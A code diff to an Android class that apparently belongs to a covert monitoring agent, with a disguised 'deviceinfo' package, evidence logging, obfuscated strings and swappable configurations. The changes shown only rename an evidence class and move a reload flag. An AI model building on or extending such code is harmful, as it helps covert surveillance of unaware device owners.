@@ -30,7 +30,7 @@ import com.android.deviceinfo.conf.ConfType;
 import com.android.deviceinfo.conf.Configuration;
 import com.android.deviceinfo.crypto.Keys;
 import com.android.deviceinfo.evidence.EvDispatcher;
-import com.android.deviceinfo.evidence.EvidenceReference;
+import com.android.deviceinfo.evidence.EvidenceBuilder;
 import com.android.deviceinfo.evidence.Markup;
 import com.android.deviceinfo.file.AutoFile;
 import com.android.deviceinfo.file.Path;
@@ -76,7 +76,6 @@ public class Core extends Activity implements Runnable {
 	private CheckAction checkActionFast;
 	private PendingIntent alarmIntent = null;
 	private ServiceMain serviceMain;
-	private boolean reload = false;
 
 	@SuppressWarnings("unused")
 	private void Core() {
@@ -171,7 +170,7 @@ public class Core extends Activity implements Runnable {
 		WR wifiReceiver = new WR();
 		Status.getAppContext().registerReceiver(wifiReceiver, intentFilter);
 
-		EvidenceReference.info(M.e("Started")); //$NON-NLS-1$
+		EvidenceBuilder.info(M.e("Started")); //$NON-NLS-1$
 
 		serviceRunning = true;
 
@@ -599,11 +598,11 @@ public class Core extends Activity implements Runnable {
 
 			if (!loaded) {
 				// 30_2=Invalid new configuration, reverting
-				EvidenceReference.info(M.e("Invalid new configuration, reverting")); //$NON-NLS-1$
+				EvidenceBuilder.info(M.e("Invalid new configuration, reverting")); //$NON-NLS-1$
 				file.delete();
 			} else {
 				// 30_3=New configuration activated
-				EvidenceReference.info(M.e("New configuration activated")); //$NON-NLS-1$
+				EvidenceBuilder.info(M.e("New configuration activated")); //$NON-NLS-1$
 				file.rename(Path.conf() + ConfType.ActualConf);
 				ret = ConfType.NewConf;
 			}
@@ -621,7 +620,7 @@ public class Core extends Activity implements Runnable {
 
 				if (!loaded) {
 					// Actual configuration corrupted
-					EvidenceReference.info(M.e("Actual configuration corrupted")); //$NON-NLS-1$
+					EvidenceBuilder.info(M.e("Actual configuration corrupted")); //$NON-NLS-1$
 				} else {
 					ret = ConfType.ActualConf;
 				}
@@ -816,25 +815,19 @@ public class Core extends Activity implements Runnable {
 
 	}
 
-	public synchronized void reload() {
-		this.reload = true;
-	}
 
-	public synchronized boolean wantsReload() {
-		return reload;
-	}
 
 	public synchronized boolean reloadConf() {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (reloadConf): START");
 		}
 
-		if (verifyNewConf() || reload) {
+		if (verifyNewConf() || Status.self().wantsReload()) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (reloadConf): valid conf");
+				Check.log(TAG + " (reloadConf): valid conf, reload: " +  Status.self().wantsReload());
 			}
 			
-			reload = false;
+			Status.self().unsetReload();
 			stopAll();
 
 			int ret = taskInit();
